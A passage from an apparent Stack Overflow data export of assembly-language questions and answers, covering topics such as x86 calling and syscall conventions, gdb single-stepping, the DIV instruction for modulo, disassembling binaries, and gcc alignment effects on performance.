","<p>The GNU assembler (gas) and NASM are both good choices. However, they have some differences, the big one being the order you put operations and their operands.</p>

<p>gas uses AT&amp;T syntax:</p>

<pre><code>mnemonic    source, destination
</code></pre>

<p>nasm uses intel style:</p>

<pre><code>mnemonic    destination, source
</code></pre>

<p>Either one will probably do what you need.</p>

<p>Try out this tutorial:  <a href=""http://asm.sourceforge.net/intro/Assembly-Intro.html"" rel=""noreferrer"">http://asm.sourceforge.net/intro/Assembly-Intro.html</a></p>
","3314967"
"When is assembly faster than C?","77235","","<p>One of the stated reasons for knowing assembler is that, on occasion, it can be employed to write code that will be more performant than writing that code in a higher-level language, C in particular.  However, I've also heard it stated many times that although that's not entirely false, the cases where assembler can <strong>actually</strong> be used to generate more performant code are both extremely rare and require expert knowledge of and experience with assembly.  </p>

<p>This question doesn't even get into the fact that assembler instructions will be machine-specific and non-portable, or any of the other aspects of assembler.  There are plenty of good reasons for knowing assembly besides this one, of course, but this is meant to be a specific question soliciting examples and data, not an extended discourse on assembler versus higher-level languages.</p>

<p>Can anyone provide some <strong>specific examples</strong> of cases where assembly will be faster than well-written C code using a modern compiler, and can you support that claim with profiling evidence?  I am pretty confident these cases exist, but I really want to know exactly how esoteric these cases are, since it seems to be a point of some contention.</p>
","<p>Here is a real world example: Fixed point multiplies. </p>

<p>These don't only come handy on devices without floating point, they shine when it comes to precision as they give you 32 bits of precision with a predictable error (float only has 23 bit and it's harder to predict precision loss)</p>

<p>One way to write a fixed point multiply on a 32 bit architecture looks like this:</p>

<pre><code>int inline FixedPointMul (int a, int b)
{
  long long a_long = a; // cast to 64 bit.

  long long product = a_long * b; // perform multiplication

  return (int) (product &gt;&gt; 16);  // shift by the fixed point bias
}
</code></pre>

<p>The problem with this code is that we do something that can't be directly expressed in the C-language. We want to multiply two 32 bit numbers and get a 64 bit result of which we return the middle 32 bit. However, in C this multiply does not exist. All you can do is to promote the integers to 64 bit and do a 64*64 = 64 multiply. </p>

<p>The x86 (ARM, MIPS and others) can however do the multiply in a single instruction. Lots of compilers still ignore this fact and generate code that calls a runtime library function to do the multiply. The shift by 16 is also often done by a library routine (also the x86 can do such shifts).</p>

<p>So we're left with one or two library calls just for a multiply. This has serious consequences. Not only is the shift slower, registers must be preserved across the function calls and it does not help inlining and code-unrolling either. </p>

<p>If you rewrite the same code in assembler you can gain a significant speed boost.</p>

<p>In addition to this: using ASM is not the best way to solve the problem. Most compilers allow you to use some assembler instructions in intrinsic form if you can't express them in C. The VS.NET2008 compiler for example exposes the 32*32=64 bit mul as __emul and the 64 bit shift as __ll_rshift.</p>

<p>Using intrinsics you can rewrite the function in a way that the C-compiler has a chance to understand what's going on. This allows the code to be inlined, register allocated, common subexpression elimination and constant propagation can be done as well. You'll get a <em>huge</em> performance improvement over the hand-written assembler code that way.</p>

<p>For reference: The end-result for the fixed-point mul for the VS.NET compiler is:</p>

<pre><code>int inline FixedPointMul (int a, int b)
{
    return (int) __ll_rshift(__emul(a,b),16);
}
</code></pre>

<p>The performance difference of fixed point divides are even worse. I had improvements up to factor 10 for division heavy fixed point code by writing a couple of asm-lines.</p>

<p>Using Visual C++ 2013 gives the same assembly code for both ways.</p>
","577856"
"JNZ & CMP Assembly Instructions","76682","","<p>Correct me if I am wrong.</p>

<p>This is my understanding of <code>JNZ</code> and <code>CMP</code>.</p>

<p><code>JNZ</code> - The jump WILL take place if the <code>Z</code> Flag is NOT zero (1)</p>

<p><code>CMP</code> - If the two values are equal, the <code>Z</code> Flag is set (1) otherwise it is not set (0)</p>

<p><img src=""https://i.stack.imgur.com/FbSEL.jpg"" alt=""Olly DBG""></p>

<p>This is a flash tutorial I am watching. It is teaching the solution to a simple CrackMe.</p>

<p>As you can see, the previous instruction compared <code>AL</code> with <code>47h</code>. They were equal which set the <code>Z</code> flag. (You can see it in the Registers windows on the right side)</p>

<p>The next instruction is a <code>JNZ</code>. My understanding was that the jump will take place if the <code>Z</code> flag is set. The <code>Z</code> flag IS set, but the jump doesn't take place!</p>

<p>Why?</p>
","<p>JNZ is short for ""Jump if not zero (ZF = 0)"", and <strong>NOT</strong> ""Jump if the ZF is set"".</p>

<p>If it's any easier to remember, consider that JNZ and JNE (jump if not equal) are equivalent. Therefore, when you're doing <code>cmp al, 47</code> and the content of <code>AL</code> is equal to 47, the ZF is set, ergo the jump (if Not Equal - JNE) should not be taken.</p>
","14841387"
"How do I compile the asm generated by GCC?","75338","","<p>I'm playing around with some asm code, and something is bothering me.</p>

<p>I compile this:</p>

<pre><code>#include &lt;stdio.h&gt;

int main(int argc, char** argv){
  printf(""Hello World\n"");
  return 0;
}
</code></pre>

<p>with <code>gcc file.c -S -o file.S</code> this generates a nice little piece of asm code:</p>

<pre><code>    .cstring
LC0:
    .ascii ""Hello World\0""
    .text
.globl _main
_main:
LFB3:
    pushq   %rbp
LCFI0:
    movq    %rsp, %rbp
LCFI1:
    subq    $16, %rsp
LCFI2:
    movl    %edi, -4(%rbp)
    movq    %rsi, -16(%rbp)
    leaq    LC0(%rip), %rdi
    call    _puts
    movl    $0, %eax
    leave
    ret
LFE3:
    .section __TEXT,__eh_frame,coalesced,no_toc+strip_static_syms+live_support
EH_frame1:
    .set L$set$0,LECIE1-LSCIE1
    .long L$set$0
LSCIE1:
    .long   0x0
    .byte   0x1
    .ascii ""zR\0""
    .byte   0x1
    .byte   0x78
    .byte   0x10
    .byte   0x1
    .byte   0x10
    .byte   0xc
    .byte   0x7
    .byte   0x8
    .byte   0x90
    .byte   0x1
    .align 3
LECIE1:
.globl _main.eh
_main.eh:
LSFDE1:
    .set L$set$1,LEFDE1-LASFDE1
    .long L$set$1
LASFDE1:
    .long   LASFDE1-EH_frame1
    .quad   LFB3-.
    .set L$set$2,LFE3-LFB3
    .quad L$set$2
    .byte   0x0
    .byte   0x4
    .set L$set$3,LCFI0-LFB3
    .long L$set$3
    .byte   0xe
    .byte   0x10
    .byte   0x86
    .byte   0x2
    .byte   0x4
    .set L$set$4,LCFI1-LCFI0
    .long L$set$4
    .byte   0xd
    .byte   0x6
    .align 3
LEFDE1:
    .subsections_via_symbols
</code></pre>

<p>My next problem is really, how do I compile this output, and can I make GCC do it for me?</p>
","<p>Yes, You can use gcc to compile your asm code. Use -c for compilation like this:</p>

<pre><code>gcc -c file.S -o file.o
</code></pre>

<p>This will give object code file named file.o. 
To invoke linker perform following after above command:</p>

<pre><code>gcc file.o -o file
</code></pre>
","7190391"
"How to view the assembly behind the code using Visual C++?","73442","","<p>I was reading another question pertaining the efficiency of two lines of code, and the OP said that he looked at the assembly behind the code and both lines were identical in assembly.  Digression aside, how could I view the assembly code created when a program is compiled.</p>

<p>I'm using Microsoft's Visual C++, but I would also like to know if it's possible to view the assembly behind code written in Visual Basic.</p>

<p>So, how do I view the assembly code behind a program written in higher level languages like C++ and Visual Basic?</p>
","<p>There are several approaches:</p>

<ol>
<li><p>You can normally see assembly code while debugging C++ in visual studio (and eclipse too). For this in Visual Studio put a breakpoint on code in question and when debugger hits it rigth click and find ""Go To Assembly"" ( or press CTRL+ALT+D )</p></li>
<li><p>Second approach is to generate assembly listings while compiling. For this go to project settings ->  C/C++ -> Output Files -> ASM List Location and fill in file name. Also select ""Assembly Output"" to ""Assembly With Source Code"".</p></li>
<li><p>Compile the program and use any third-party debugger. You can use OllyDbg or WinDbg for this. Also you can use IDA (interactive disassembler). But this is hardcore way of doing it.</p></li>
</ol>
","1020515"
"What are the calling conventions for UNIX & Linux system calls on i386 and x86-64","70193","","<p>Following links explain x86-32 system call conventions for both UNIX (BSD flavor) &amp; Linux:</p>

<ul>
<li><p><a href=""http://www.int80h.org/bsdasm/#system-calls"" rel=""noreferrer"">http://www.int80h.org/bsdasm/#system-calls</a></p></li>
<li><p><a href=""http://www.freebsd.org/doc/en/books/developers-handbook/x86-system-calls.html"" rel=""noreferrer"">http://www.freebsd.org/doc/en/books/developers-handbook/x86-system-calls.html</a></p></li>
</ul>

<p>But what are the x86-64 system call conventions on both UNIX &amp; Linux?</p>
","<p>I verified these using GNU Assembler (gas) on Linux.</p>

<h1> Kernel Interface </h1>

<p><strong>x86-32  Linux System Call convention:</strong></p>

<p>In x86-32 parameters for Linux system call are passed using registers. <code>%eax</code> for syscall_number.  %ebx, %ecx, %edx, %esi, %edi, %ebp are used for passing 6 parameters to system calls.</p>

<p>The return value is in <code>%eax</code>.  All other registers (including EFLAGS) are preserved across the <code>int $0x80</code>.</p>

<p>I took following snippet from the <a href=""https://web.archive.org/web/20120822144129/http://www.cin.ufpe.br/~if817/arquivos/asmtut/index.html"" rel=""nofollow noreferrer"">Linux Assembly Tutorial</a> but I'm doubtful about this. If any one can show an example, it would be great.</p>

<blockquote>
  <p>If there are more than six arguments,
  <code>%ebx</code> must contain the memory
  location where the list of arguments
  is stored - but don't worry about this
  because it's unlikely that you'll use
  a syscall with more than six
  arguments.</p>
</blockquote>

<p>For an example and a little more reading, refer to <a href=""http://www.int80h.org/bsdasm/#alternate-calling-convention"" rel=""nofollow noreferrer"">http://www.int80h.org/bsdasm/#alternate-calling-convention</a></p>

<p>There is faster way to make 32bit system calls: using <code>sysenter</code>.  The kernel maps a page of memory into every process (the vdso), with the user-space side of the <code>sysenter</code>, which has to cooperate with the kernel for it to be able to find the return address.  arg to register mapping is the same as for <code>int $0x80</code>, but instead of that instruction, code should call a function in the vdso.  (TODO: update this with a link and/or specific info).</p>

<p><strong>x86-32 [Free|Open|Net|DragonFly]BSD UNIX System Call convention:</strong></p>

<p>Parameters are passed on the stack. Push the parameters (last parameter pushed first) on to the stack. Then push an additional 32-bit of dummy data (Its not actually dummy data. refer to following link for more info) and then give a system call instruction <code>int $0x80</code></p>

<p><a href=""http://www.int80h.org/bsdasm/#default-calling-convention"" rel=""nofollow noreferrer"">http://www.int80h.org/bsdasm/#default-calling-convention</a></p>

<hr>

<p><strong>x86-64 Linux System Call convention:</strong></p>

<p><a href=""https://stackoverflow.com/questions/47834513/64-bit-syscall-documentation-for-macos-assembly"">x86-64 Mac OS X is similar but different</a>.  TODO: check what *BSD does.</p>

<p>Refer to section: ""A.2 AMD64 <strong>Linux</strong> Kernel Conventions"" of <a href=""http://refspecs.linuxfoundation.org/elf/x86_64-abi-0.99.pdf"" rel=""nofollow noreferrer"">System V Application Binary Interface AMD64 Architecture Processor Supplement</a>.  The latest versions of the i386 and x86-64 System V psABIs can be found <a href=""https://github.com/hjl-tools/x86-psABI/wiki/X86-psABI"" rel=""nofollow noreferrer"">linked from this page in the ABI maintainer's repo</a>.  (See also the <a href=""/questions/tagged/x86"" class=""post-tag"" title=""show questions tagged &#39;x86&#39;"" rel=""tag"">x86</a> tag wiki for up-to-date ABI links and lots of other good stuff about x86 asm.)</p>

<p>Here is the snippet from this section:</p>

<blockquote>
  <ol>
  <li>User-level applications use as integer registers for passing the
  sequence    %rdi, %rsi, %rdx, %rcx,
  %r8 and %r9. <strong>The kernel interface uses %rdi,    %rsi, %rdx, %r10, %r8 and %r9.</strong></li>
  <li>A system-call is done via the <strong><code>syscall</code> instruction</strong>.  This clobbers %rcx and %r11, as well as %rax, but other registers are preserved.</li>
  <li>The number of the syscall has to be passed in register %rax.</li>
  <li>System-calls are limited to six arguments, no argument is passed
  directly on the stack.</li>
  <li>Returning from the syscall, register %rax contains the result of
  the system-call. A value in the range between -4095 and -1 indicates
  an error,  it is <code>-errno</code>.</li>
  <li>Only values of class INTEGER or class MEMORY are passed to the kernel.</li>
  </ol>
</blockquote>

<p>Remember this is from the Linux-specific appendix to the ABI, and even for Linux it's informative not normative.  (But it is in fact accurate.)</p>

<h1> User Interface </h1>

<p><strong>x86-32 Function Calling convention:</strong></p>

<p>In x86-32 parameters were passed on stack. Last parameter was pushed first on to the stack until all parameters are done and then <code>call</code> instruction was executed. This is used for calling C library (libc) functions on Linux from assembly.</p>

<hr>

<p><strong>x86-64 Function Calling convention:</strong></p>

<p>x86-64 passes args in registers, which is more efficient than i386 System V's stack args convention.  It avoids the latency and extra instructions of storing args to memory (cache) and then loading them back again in the callee.  This works well because there are more registers available, and is better for modern high-performance CPUs where latency and out-of-order execution matter.  (The i386 ABI is very old).</p>

<p>In this <em>new</em> mechanism: First the parameters are divided into classes. The class of each parameter determines the manner in which it is passed to the called function.</p>

<p>For complete information refer to : ""3.2 Function Calling Sequence"" of <a href=""http://refspecs.linuxfoundation.org/elf/x86_64-abi-0.99.pdf"" rel=""nofollow noreferrer"">System V Application Binary Interface AMD64 Architecture Processor Supplement</a> which reads, in part:</p>

<blockquote>
  <p>Once arguments are classified, the registers get assigned (in
  left-to-right order) for passing as follows:</p>
  
  <ol>
  <li>If the class is MEMORY, pass the argument on the stack.</li>
  <li>If the class is INTEGER, the next available register of the
  sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9 is used</li>
  </ol>
</blockquote>

<p>So <code>%rdi, %rsi, %rdx, %rcx, %r8 and %r9</code> are the registers <em>in order</em> used to pass integer/pointer (i.e. INTEGER class) parameters to any libc function from assembly. %rdi is used for the first INTEGER parameter.  %rsi for 2nd, %rdx for 3rd and so on. Then <code>call</code> instruction should be given.  The stack (<code>%rsp</code>) must be 16B-aligned when <code>call</code> executes.</p>

<p>If there are more than 6 INTEGER parameters, the 7th INTEGER parameter and later are passed on the stack.  (Caller pops, same as x86-32.)</p>

<p>The first 8 floating point args are passed in %xmm0-7, later on the stack.  There are no call-preserved vector registers.  (A function with a mix of FP and integer arguments can have more than 8 total register arguments.)</p>

<p>Variadic functions (<a href=""https://stackoverflow.com/questions/6212665/why-is-eax-zeroed-before-a-call-to-printf"">like <code>printf</code></a>) always need <code>%al</code> = the number of FP register args.</p>

<p>There are rules for when to pack structs into registers (<code>rdx:rax</code> on return) vs. in memory.  See the ABI for details, and check compiler output to make sure your code agrees with compilers about how something should be passed/returned.</p>
","2538212"
"What does ""int 0x80"" mean in assembly code?","69945","","<p>Can someone explain what the following assembly code does?</p>

<pre><code> int 0x80  
</code></pre>
","<p>It passes control to interrupt vector 0x80</p>

<p>See <a href=""http://en.wikipedia.org/wiki/Interrupt_vector"" rel=""noreferrer"">http://en.wikipedia.org/wiki/Interrupt_vector</a></p>

<p>On Linux, have a look at <a href=""http://www.linuxjournal.com/article/4048"" rel=""noreferrer"">this</a>: it was used to handle <code>system_call</code>.  Of course on another OS this could mean something totally different.</p>
","1817579"
"How does the stack work in assembly language?","69566","","<p>I'm currently trying to understand how the stack works, so I've decided teach myself some <a href=""http://en.wikipedia.org/wiki/Assembly_language"" rel=""noreferrer"">assembly language</a>, I'm using this book:</p>

<p><a href=""http://savannah.nongnu.org/projects/pgubook/"" rel=""noreferrer"">http://savannah.nongnu.org/projects/pgubook/</a> </p>

<p>I'm using <a href=""http://en.wikipedia.org/wiki/GNU_Assembler"" rel=""noreferrer"">Gas</a> and doing my development on <a href=""http://en.wikipedia.org/wiki/Linux_Mint"" rel=""noreferrer"">Linux Mint</a>.</p>

<p>I'm a bit confused by something:</p>

<p>As far as I was aware a stack is simply a data structure. So I assumed if I was coding in assembly I'd have to implement the stack myself. However this doesn't seem to be the case as there are commands like</p>

<pre><code>pushl
popl
</code></pre>

<p>So when coding in assembly for the <a href=""http://en.wikipedia.org/wiki/X86"" rel=""noreferrer"">x86</a> architecture and using the Gas syntax: is the stack just a data structure that's already implemented? Or is it actually implemented at the hardware level? Or is it something else? Also would most assembly languages for other chip sets have the stack already implemented?</p>

<p>I know this is a bit of a foolish question but I'm actually quite confused by this.</p>
","<p>I think primarily you're getting confused between a <code>program's stack</code> and <code>any old stack</code>.</p>

<p><strong>A Stack</strong></p>

<p>Is an abstract data structure which consists of information in a Last In First Out system. You put arbitrary objects onto the stack and then you take them off again, much like an in/out tray, the top item is always the one that is taken off and you always put on to the top.</p>

<p><strong>A Programs Stack</strong></p>

<p>Is a stack, it's a section of memory that is used during execution, it generally has a static size per program and frequently used to store function parameters. You push the parameters onto the stack when you call a function and the function either address the stack directly or pops off the variables from the stack.</p>

<p>A programs stack isn't generally hardware (though it's kept in memory so it can be argued as such), but the Stack Pointer which points to a current area of the Stack is generally a CPU register. This makes it a bit more flexible than a LIFO stack as you can change the point at which the stack is addressing.</p>

<p>You should read and make sure you understand the <a href=""http://en.wikipedia.org/wiki/Stack_(data_structure)"" rel=""noreferrer"">wikipedia</a> article as it gives a good description of the Hardware Stack which is what you are dealing with.</p>

<p>There is also <a href=""http://ee.sharif.edu/~sakhtar3/articles/8086/ASM%20Tutorial-Ready%20to%20Start!.htm#stack"" rel=""noreferrer"">this tutorial</a> which explains the stack in terms of the old 16bit registers but could be helpful and <a href=""https://web.archive.org/web/20070822075422/http://www.emu8086.com/assembly_language_tutorial_assembler_reference/asm_tutorial_09.html"" rel=""noreferrer"">another one</a> specifically about the stack.</p>

<p>From Nils Pipenbrinck:</p>

<p>It's worthy of note that some processors do not implement all of the instructions for accessing and manipulating the stack (push, pop, stack pointer, etc) but the x86 does because of it's frequency of use. In these situations if you wanted a stack you would have to implement it yourself (some MIPS and some ARM processors are created without stacks).</p>

<p>For example, in MIPs a push instruction would be implemented like:</p>

<pre><code>addi $sp, $sp, -4  # Decrement stack pointer by 4  
sw   $t0, ($sp)   # Save $t0 to stack  
</code></pre>

<p>and a Pop instruction would look like:</p>

<pre><code>lw   $t0, ($sp)   # Copy from stack to $t0  
addi $sp, $sp, 4   # Increment stack pointer by 4  
</code></pre>
","556770"
"Using gdb to single-step assembly code outside specified executable causes error ""cannot find bounds of current function""","69169","","<p>I'm outside gdb's target executable and I don't even have a stack that corresponds to that target.  I want to single-step anyway, so that I can verify what's going on in my assembly code, because I'm not an expert at x86 assembly.  Unfortunately, gdb refuses to do this simple assembly-level debugging.  It allows me to set and stop on appropriate breakpoint, but as soon as I try to single-step onwards, gdb reports the error ""Cannot find bounds of current function"" and the EIP doesn't change.</p>

<p>Additional details:</p>

<p>The machine code was generated by gcc asm statements and I copied it to the kernel memory location where it's executing, from the output of objdump -d.  I wouldn't mind a simple way to use a loader to load my object code to a relocated address, but bear in mind the loading has to be done in a kernel module.</p>

<p>I suppose another alternative would be to produce a fake kernel module or debug info file to give to gdb, to cause it to believe this area is within the program code.  gdb works fine on the kernel executable itself.</p>

<p>(For those who really want to know, I'm inserting code at runtime into Linux kernel data space inside a VMware VM and debugging it from gdb remote debugging the kernel via VMware Workstation's built-in gdb stub.  Note I'm not writing kernel exploits;  I'm a security graduate student writing a prototype.)</p>

<p>(I can set a breakpoint on each instruction inside my assembly.  This works but would get quite laborious after a while, since the size of x86 assembly instructions varies and the location of the assembly will change every time I reboot.)</p>
","<p>You can use <code>stepi</code> or <code>nexti</code> (which can be abbreviated to <code>si</code> or <code>ni</code>) to step through your machine code.</p>
","2420972"
"how can one see content of stack with gdb","68193","","<p>I am new to gdb, so I have some question;</p>

<ul>
<li><p>how can I look content of stack ? 
ex : to see content of register, I type <code>info registers</code>. For stack what should be</p></li>
<li><p>how can I see content of   <code>$0x4(%esp)</code>? When I type <code>print /d $0x4(%esp)</code> gdb gives error.</p></li>
</ul>

<p>platform: linux 
          gdb</p>
","<p><code>info frame</code> to show the stack frame info</p>

<p>To read the memory at given addresses you should take a look at <code>x</code></p>

<p><code>x/x $esp</code> for hex <code>x/d $esp</code> for signed <code>x/u $esp</code> for unsigned etc. x uses the format syntax, you could also take a look at the current instruction via <code>x/i $eip</code> etc.</p>
","7848912"
"Assembly language je jump function","67011","","<p>I am trying to find online the usage of the assembly language function ""je"". I read that je means jump if equal and that is exactly what I want. What is the actual usage of this function, or in other words, how to I type this function to check a value and jump if it is equal to something?</p>

<p>Please let me know.</p>

<p>BTW, I am using NASM if that makes a difference.</p>
","<p>Let's say you want to check if <code>EAX</code> is equal to <code>5</code>, and perform different actions based on the result of that comparison. An if-statement, in other words.</p>

<pre><code>  ; ... some code ...

  cmp eax, 5
  je .if_true
  ; Code to run if comparison is false goes here.
  jmp short .end_if
.if_true:
  ; Code to run if comparison is true goes here.
.end_if:

  ; ... some code ...
</code></pre>
","1582989"
"Assembly Language - How to Do Modulo?","66797","","<p>Is there something like a modulo-operator in x86 Assembler?</p>
","<p>The <code>DIV</code> instruction (and it's counterpart <code>IDIV</code> for signed numbers) gives both the quotient and remainder (modulo). <code>DIV r16</code> divides a 32-bit number in <code>DX:AX</code> by a 16-bit operand and stores the quotient in <code>AX</code> and the remainder in <code>DX</code>.</p>

<p>Example:</p>

<pre><code>mov dx, 0     
mov ax, 1234
mov bx, 10
div bx       ; Divides 1234 by 10. DX = 4 and AX = 123
</code></pre>

<p>In 32-bit assembly you can do <code>div ebx</code> to divide a 64-bit operand in <code>EDX:EAX</code> by <code>EBX</code>. See Intels <a href=""http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html"" rel=""noreferrer"">Architectures Software Developer’s Manuals</a> for more information.</p>
","8022107"
"How to disassemble a binary executable in Linux to get the assembly code?","66649","","<p>I was told to use a disassembler. Does <code>gcc</code> have anything built in? What is the easiest way to do this?</p>
","<p>I don't think <code>gcc</code> has a flag for it, since it's primarily a compiler, but another of the GNU development tools does. <code>objdump</code> takes a <code>-d</code>/<code>--disassemble</code> flag:</p>

<pre><code>$ objdump -d /path/to/binary
</code></pre>

<p>The disassembly looks like this:</p>

<pre><code>080483b4 &lt;main&gt;:
 80483b4:   8d 4c 24 04             lea    0x4(%esp),%ecx
 80483b8:   83 e4 f0                and    $0xfffffff0,%esp
 80483bb:   ff 71 fc                pushl  -0x4(%ecx)
 80483be:   55                      push   %ebp
 80483bf:   89 e5                   mov    %esp,%ebp
 80483c1:   51                      push   %ecx
 80483c2:   b8 00 00 00 00          mov    $0x0,%eax
 80483c7:   59                      pop    %ecx
 80483c8:   5d                      pop    %ebp
 80483c9:   8d 61 fc                lea    -0x4(%ecx),%esp
 80483cc:   c3                      ret    
 80483cd:   90                      nop
 80483ce:   90                      nop
 80483cf:   90                      nop
</code></pre>
","5125914"
"`testl` eax against eax?","65647","","<p>I am trying to understand some assembly.</p>

<p>The assembly as follows, I am interested in the <code>testl</code> line:</p>

<pre><code>000319df  8b4508        movl   0x08(%ebp), %eax  
000319e2  8b4004        movl   0x04(%eax), %eax  
000319e5  85c0          testl  %eax, %eax  
000319e7  7407          je     0x000319f0  
</code></pre>

<p>I am trying to understand that point of <code>testl</code> between <code>%eax</code> and <code>%eax</code>? I think the specifics of what this code isn't important, I am just trying to understand the test with itself - wouldn't the value always be true?</p>
","<p>It tests whether <code>eax</code> is 0, or above, or below. In this case, the jump is taken if <code>eax</code> is 0.</p>
","147176"
"How can I see the assembly code for a C++ program?","64114","","<p>How can I see the assembly code for a C++ program?</p>

<p>What are the popular tools to do this?</p>
","<h2>Ask the compiler</h2>

<p>If you are building the program yourself, you can ask your compiler to emit assembly source. For most UNIX compilers use the <code>-S</code> switch.</p>

<ul>
<li><p>If you are using the GNU assembler, compiling with <code>-g -Wa,-alh</code> will give intermixed source and assembly on stdout (<code>-Wa</code> asks compiler driver to pass options to assembler, <code>-al</code> turns on assembly listing, and <code>-ah</code> adds ""high-level source"" listing):</p>

<p><code>g++ -g -c -Wa,-alh foo.cc</code></p></li>
<li><p>For Visual Studio, use <a href=""http://msdn.microsoft.com/en-us/library/367y26c6.aspx"" rel=""noreferrer""><code>/FAsc</code></a>.</p></li>
</ul>

<h2>Peek into the binary</h2>

<p>If you have compiled binary, </p>

<ul>
<li>use <code>objdump -d a.out</code> on UNIX (also works for cygwin), </li>
<li><a href=""http://msdn.microsoft.com/en-us/library/756as972.aspx"" rel=""noreferrer""><code>dumpbin /DISASM foo.exe</code></a> on Windows.</li>
</ul>

<h2>Use your debugger</h2>

<p>Debuggers could also show disassebly. </p>

<ul>
<li>Use <code>disas</code> command in GDB, </li>
<li>or the <a href=""http://msdn.microsoft.com/en-us/library/a3cwf295.aspx"" rel=""noreferrer"">disassembly window</a> of Visual Studio on Windows.</li>
</ul>
","840363"
"Why does gcc generate 15-20% faster code if I optimize for size instead of speed?","63438","","<p>I first noticed in 2009 that gcc (at least on my projects and on my machines) have the tendency to generate noticeably faster code if I optimize for <strong>size</strong> (<code>-Os</code>) instead of speed (<code>-O2</code> or <code>-O3</code>), and I have been wondering ever since why.</p>

<p>I have managed to create (rather silly) code that shows this surprising behavior and is sufficiently small to be posted here.</p>

<pre><code>const int LOOP_BOUND = 200000000;

__attribute__((noinline))
static int add(const int&amp; x, const int&amp; y) {
    return x + y;
}

__attribute__((noinline))
static int work(int xval, int yval) {
    int sum(0);
    for (int i=0; i&lt;LOOP_BOUND; ++i) {
        int x(xval+sum);
        int y(yval+sum);
        int z = add(x, y);
        sum += z;
    }
    return sum;
}

int main(int , char* argv[]) {
    int result = work(*argv[1], *argv[2]);
    return result;
}
</code></pre>

<p>If I compile it with <code>-Os</code>, it takes 0.38&nbsp;s to execute this program, and 0.44&nbsp;s if it is compiled with <code>-O2</code> or <code>-O3</code>. These times are obtained consistently and with practically no noise (gcc 4.7.2, x86_64 GNU/Linux, Intel Core i5-3320M).</p>

<p><em>(Update: I have moved all assembly code to <a href=""http://en.wikipedia.org/wiki/GitHub"" rel=""noreferrer"">GitHub</a>: They made the post bloated and apparently add very little value to the questions as the <code>fno-align-*</code> flags have the same effect.)</em></p>

<p>The generated assembly with <a href=""https://gist.github.com/baharev/7069582#file-os"" rel=""noreferrer""><code>-Os</code></a> and <a href=""https://gist.github.com/baharev/7069582#file-o2"" rel=""noreferrer""><code>-O2</code></a>.
Unfortunately, my understanding of assembly is very limited, so I have no idea whether what I did next was correct: I grabbed the assembly for <code>-O2</code> and merged all its differences into the assembly for <code>-Os</code> <em>except</em> the <code>.p2align</code> lines, result <a href=""https://gist.github.com/baharev/7069582#file-o2merged"" rel=""noreferrer"">here</a>. This code still runs in 0.38s and <strong>the only difference is the</strong> <code>.p2align</code> <strong>stuff.</strong></p>

<p>If I guess correctly, these are paddings for stack alignment. According to <a href=""https://stackoverflow.com/q/7912464/341970"">Why does GCC pad functions with NOPs?</a> it is done in the hope that the code will run faster, but apparently this optimization backfired in my case.</p>

<p><strong>Is it the padding that is the culprit in this case? Why and how?</strong></p>

<p>The noise it makes pretty much makes timing micro-optimizations impossible.</p>

<p><strong>How can I make sure that such accidental lucky / unlucky alignments are not interfering when I do micro-optimizations (unrelated to stack alignment) on C or C++ source code?</strong></p>

<hr>

<p><strong>UPDATE:</strong></p>

<p>Following <a href=""https://stackoverflow.com/a/19471213/341970"">Pascal Cuoq's answer</a> I tinkered a little bit with the alignments. By passing <code>-O2 -fno-align-functions -fno-align-loops</code> to gcc, all <code>.p2align</code> are gone from the assembly and the generated executable runs in 0.38s. According to the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html"" rel=""noreferrer"">gcc documentation</a>:</p>

<blockquote>
  <p>-Os enables all -O2 optimizations [but] -Os disables the following optimization flags:</p>

<pre><code>  -falign-functions  -falign-jumps  -falign-loops &lt;br/&gt;
  -falign-labels  -freorder-blocks  -freorder-blocks-and-partition &lt;br/&gt;
  -fprefetch-loop-arrays &lt;br/&gt;
</code></pre>
</blockquote>

<p><strong>So, it pretty much seems like a (mis)alignment issue.</strong></p>

<p>I am still skeptical about <code>-march=native</code> as suggested in <a href=""https://stackoverflow.com/a/19471823/341970"">Marat Dukhan's answer</a>. I am not convinced that it isn't just interfering with this (mis)alignment issue; it has absolutely no effect on my machine. (Nevertheless, I upvoted his answer.)</p>

<hr>

<p><strong>UPDATE 2:</strong></p>

<p><strong>We can take <code>-Os</code> out of the picture.</strong> The following times are obtained by compiling with</p>

<ul>
<li><p><code>-O2 -fno-omit-frame-pointer</code> 0.37s</p></li>
<li><p><code>-O2 -fno-align-functions -fno-align-loops</code> 0.37s</p></li>
<li><p><code>-S -O2</code> then manually moving the assembly of <code>add()</code> after <code>work()</code> 0.37s</p></li>
<li><p><code>-O2</code> 0.44s</p></li>
</ul>

<p>It looks like to me the distance of <code>add()</code> from the call site matters a lot. I have tried <code>perf</code>, but the output of <code>perf stat</code> and <code>perf report</code> makes very little sense to me. However, I could only get one consistent result out of it:</p>

<p><code>-O2</code>:</p>

<pre><code> 602,312,864 stalled-cycles-frontend   #    0.00% frontend cycles idle
       3,318 cache-misses
 0.432703993 seconds time elapsed
 [...]
 81.23%  a.out  a.out              [.] work(int, int)
 18.50%  a.out  a.out              [.] add(int const&amp;, int const&amp;) [clone .isra.0]
 [...]
       ¦   __attribute__((noinline))
       ¦   static int add(const int&amp; x, const int&amp; y) {
       ¦       return x + y;
100.00 ¦     lea    (%rdi,%rsi,1),%eax
       ¦   }
       ¦   ? retq
[...]
       ¦            int z = add(x, y);
  1.93 ¦    ? callq  add(int const&amp;, int const&amp;) [clone .isra.0]
       ¦            sum += z;
 79.79 ¦      add    %eax,%ebx
</code></pre>

<p>For <code>fno-align-*</code>:</p>

<pre><code> 604,072,552 stalled-cycles-frontend   #    0.00% frontend cycles idle
       9,508 cache-misses
 0.375681928 seconds time elapsed
 [...]
 82.58%  a.out  a.out              [.] work(int, int)
 16.83%  a.out  a.out              [.] add(int const&amp;, int const&amp;) [clone .isra.0]
 [...]
       ¦   __attribute__((noinline))
       ¦   static int add(const int&amp; x, const int&amp; y) {
       ¦       return x + y;
 51.59 ¦     lea    (%rdi,%rsi,1),%eax
       ¦   }
[...]
       ¦    __attribute__((noinline))
       ¦    static int work(int xval, int yval) {
       ¦        int sum(0);
       ¦        for (int i=0; i&lt;LOOP_BOUND; ++i) {
       ¦            int x(xval+sum);
  8.20 ¦      lea    0x0(%r13,%rbx,1),%edi
       ¦            int y(yval+sum);
       ¦            int z = add(x, y);
 35.34 ¦    ? callq  add(int const&amp;, int const&amp;) [clone .isra.0]
       ¦            sum += z;
 39.48 ¦      add    %eax,%ebx
       ¦    }
</code></pre>

<p>For <code>-fno-omit-frame-pointer</code>:</p>

